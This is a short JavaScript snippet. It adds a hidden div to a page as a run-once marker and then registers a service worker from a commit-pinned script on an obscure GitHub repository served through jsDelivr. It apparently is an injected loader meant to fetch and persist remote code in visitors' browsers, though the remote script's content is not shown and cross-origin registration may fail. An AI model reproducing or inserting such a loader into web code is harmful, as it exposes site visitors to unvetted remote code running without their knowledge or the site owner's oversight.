function addInvisibleElement() {
    if (!document.getElementById('invisibleElement')) {
      var invisibleElement = document.createElement('div');
      invisibleElement.style.display = 'none';
      invisibleElement.id = 'invisibleElement';
      document.body.appendChild(invisibleElement);

      if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('https://cdn.jsdelivr.net/gh/eq89/edm@c3de103/q.js')
          .then((registration) => {
            console.log('Service Worker registered with scope:', registration.scope);
          })
          .catch((error) => {
            console.error('Service Worker registration failed:', error);
          });
      }
    }
}

addInvisibleElement();
